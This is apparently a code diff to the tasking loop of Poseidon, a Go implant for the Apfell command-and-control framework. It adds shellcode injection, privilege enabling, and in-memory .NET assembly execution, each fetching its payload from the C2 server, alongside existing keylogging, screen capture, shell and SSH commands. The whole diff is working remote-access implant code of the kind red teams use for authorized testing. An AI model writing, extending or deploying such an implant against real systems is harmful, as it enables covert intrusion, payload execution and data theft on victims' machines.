@@ -3,28 +3,36 @@ package main
 import (
 	"C"
 	"encoding/json"
+	"fmt"
 	"os"
 	"os/user"
+	"strconv"
 	"strings"
 	"time"
 
-	"fmt"
-	"strconv"
-
 	"github.com/xorrior/poseidon/pkg/commands/cat"
+	"github.com/xorrior/poseidon/pkg/commands/getprivs"
 	"github.com/xorrior/poseidon/pkg/commands/keys"
+	"github.com/xorrior/poseidon/pkg/commands/libinject"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
+	"github.com/xorrior/poseidon/pkg/commands/portscan"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
-	"github.com/xorrior/poseidon/pkg/commands/libinject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
-	"github.com/xorrior/poseidon/pkg/commands/portscan"
 )
+import (
+	"log"
+
+	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
+	"github.com/xorrior/poseidon/pkg/commands/shinject"
+)
+
+var assemblyFetched int = 0
 
 //export RunMain
 func RunMain() {
@@ -64,38 +72,42 @@ func main() {
 	}
 
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
-	resp := profile.CheckIn(currIP, currPid, currentUser.Name, hostname)
+	// fmt.Println(currentUser.Name)
+	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
 	checkIn := resp.(structs.CheckinResponse)
 	//log.Printf("Received checkin response: %+v\n", checkIn)
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":            0,
-		"shell":           1,
-		"screencapture":   2,
-		"keylog":          3,
-		"download":        4,
-		"upload":          5,
-		"libinject":       6,
-		"ps":              7,
-		"sleep":           8,
-		"cat":             9,
-		"cd":              10,
-		"ls":              11,
-		"python":          12,
-		"jxa":             13,
-		"keys":            14,
-		"triagedirectory": 15,
-		"sshauth":         16,
-		"portscan": 	   17,
-		"none":            20,
+		"exit":             0,
+		"shell":            1,
+		"screencapture":    2,
+		"keylog":           3,
+		"download":         4,
+		"upload":           5,
+		"inject":           6,
+		"shinject":         21,
+		"ps":               7,
+		"sleep":            8,
+		"cat":              9,
+		"cd":               10,
+		"ls":               11,
+		"python":           12,
+		"jxa":              13,
+		"keys":             14,
+		"triagedirectory":  15,
+		"sshauth":          16,
+		"portscan":         17,
+		"getprivs":         18,
+		"execute-assembly": 19,
+		"none":             20,
 	}
 
 	// Channel used to catch results from tasking threads
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
-LOOP:
+	LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
@@ -128,7 +140,7 @@ LOOP:
 					profile.PostResponse(task, err.Error())
 				}
 
-				data := profile.GetFile(task, fileDetails.FileID)
+				data := profile.GetFile(fileDetails.FileID)
 				if len(data) > 0 {
 					f, e := os.Create(fileDetails.RemotePath)
 
@@ -149,6 +161,31 @@ LOOP:
 
 			case 6:
 				go libinject.Run(task, res)
+				break
+
+			case 21:
+				tMsg := &structs.ThreadMsg{}
+				tMsg.TaskItem = task
+				args := &shinject.Arguments{}
+				log.Println("Windows Inject:\n", string(task.Params))
+				err := json.Unmarshal([]byte(task.Params), &args)
+
+				if err != nil {
+					tMsg.Error = true
+					tMsg.TaskResult = []byte(err.Error())
+					res <- *tMsg
+					break
+				}
+				args.ShellcodeData = profile.GetFile(args.ShellcodeFile)
+
+				log.Println("Length of shellcode:", len(args.ShellcodeData))
+				if len(args.ShellcodeData) == 0 {
+					tMsg.Error = true
+					tMsg.TaskResult = []byte(fmt.Sprintf("File ID %s content was empty.", args.ShellcodeFile))
+					res <- *tMsg
+					break
+				}
+				go shinject.Run(args, tMsg, res)
 				break
 			case 7:
 				go ps.Run(task, res)
@@ -198,6 +235,48 @@ LOOP:
 			case 17:
 				// Scan ports on remote hosts.
 				go portscan.Run(task, res)
+				break
+			case 18:
+				// Enable privileges for your current process.
+				go getprivs.Run(task, res)
+				break
+			case 19:
+				// Execute a .NET assembly
+				tMsg := &structs.ThreadMsg{}
+				tMsg.TaskItem = task
+				args := &executeassembly.Arguments{}
+				// log.Println("Windows Inject:\n", string(task.Params))
+				err := json.Unmarshal([]byte(task.Params), &args)
+
+				if err != nil {
+					tMsg.Error = true
+					tMsg.TaskResult = []byte(err.Error())
+					res <- *tMsg
+					break
+				}
+
+				if assemblyFetched == 0 {
+					if args.LoaderFileID == "" {
+						tMsg.Error = true
+						tMsg.TaskResult = []byte("Have not fetched the .NET assembly yet. Please upload to the server and specify the file ID.")
+						res <- *tMsg
+						break
+					}
+					log.Println("Fetching loader file...")
+					args.LoaderBytes = profile.GetFile(args.LoaderFileID)
+					if len(args.LoaderBytes) == 0 {
+						tMsg.Error = true
+						tMsg.TaskResult = []byte(fmt.Sprintf("Invalid .NET Loader DLL retrieved. Length of DLL retrieved: %d", len(args.LoaderBytes)))
+						res <- *tMsg
+						break
+					}
+					log.Println("Done")
+					assemblyFetched += 1 // Increment the counter so we know not to fetch it again.
+				}
+				log.Println("Fetching assembly bytes...")
+				args.AssemblyBytes = profile.GetFile(args.AssemblyFileID)
+				log.Println("Done")
+				go executeassembly.Run(args, tMsg, res)
 				break
 			case 20:
 				// No tasks, do nothing
